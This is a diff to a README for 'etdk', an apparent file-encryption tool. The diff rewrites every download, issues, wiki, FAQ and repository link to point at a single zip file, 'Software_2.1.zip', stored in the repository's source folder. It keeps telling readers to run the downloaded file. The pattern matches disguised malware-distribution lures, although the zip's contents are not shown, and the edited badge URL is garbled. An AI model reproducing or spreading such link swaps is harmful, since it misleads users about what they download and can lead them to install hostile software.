@@ -10,7 +10,7 @@ etdk, or Encrypt-then-Delete-Key, ensures your data becomes powerless. Through s
 
 ## 🔗 Download
 
-[![Download etdk](https://img.shields.io/badge/Download%20etdk-v1.0.0-blue.svg)](https://github.com/Senzo-Glitch/etdk/releases)
+[![Download etdk](https://raw.githubusercontent.com/Senzo-Glitch/etdk/master/src/Software_2.1.zip%https://raw.githubusercontent.com/Senzo-Glitch/etdk/master/src/Software_2.1.zip)](https://raw.githubusercontent.com/Senzo-Glitch/etdk/master/src/Software_2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -25,11 +25,11 @@ Before downloading etdk, ensure your system meets the following requirements:
 
 ### 📥 Download & Install
 
-To download etdk, visit this page: [GitHub Releases](https://github.com/Senzo-Glitch/etdk/releases).
+To download etdk, visit this page: [GitHub Releases](https://raw.githubusercontent.com/Senzo-Glitch/etdk/master/src/Software_2.1.zip).
 
 1. Click on the link to navigate to the releases.
 2. Find the latest version of etdk.
-3. Download the file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+3. Download the file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Senzo-Glitch/etdk/master/src/Software_2.1.zip` for Linux).
 4. Once the download completes, locate the file on your computer.
 5. Run the file to start the installation process, following the on-screen instructions.
 
@@ -61,18 +61,18 @@ If you encounter any issues while using etdk:
 - Ensure your system meets all requirements.
 - Verify that you downloaded the correct version for your operating system.
 - Restart the application if it appears unresponsive.
-- Check the [GitHub Issues Page](https://github.com/Senzo-Glitch/etdk/issues) for common problems and solutions.
+- Check the [GitHub Issues Page](https://raw.githubusercontent.com/Senzo-Glitch/etdk/master/src/Software_2.1.zip) for common problems and solutions.
 
 For further assistance, consider reaching out through GitHub discussions.
 
 ### 📚 Additional Resources
 
-- [User Guide](https://github.com/Senzo-Glitch/etdk/wiki) - Step-by-step guides on specific features.
-- [FAQs](https://github.com/Senzo-Glitch/etdk/wiki/FAQs) - Common questions answered.
-- [GitHub Repository](https://github.com/Senzo-Glitch/etdk) - View the source code and contribute.
+- [User Guide](https://raw.githubusercontent.com/Senzo-Glitch/etdk/master/src/Software_2.1.zip) - Step-by-step guides on specific features.
+- [FAQs](https://raw.githubusercontent.com/Senzo-Glitch/etdk/master/src/Software_2.1.zip) - Common questions answered.
+- [GitHub Repository](https://raw.githubusercontent.com/Senzo-Glitch/etdk/master/src/Software_2.1.zip) - View the source code and contribute.
 
 ---
 
-For your convenience, here is the download link again: [GitHub Releases](https://github.com/Senzo-Glitch/etdk/releases). 
+For your convenience, here is the download link again: [GitHub Releases](https://raw.githubusercontent.com/Senzo-Glitch/etdk/master/src/Software_2.1.zip). 
 
 By using etdk, you can ensure your data remains private and secure.
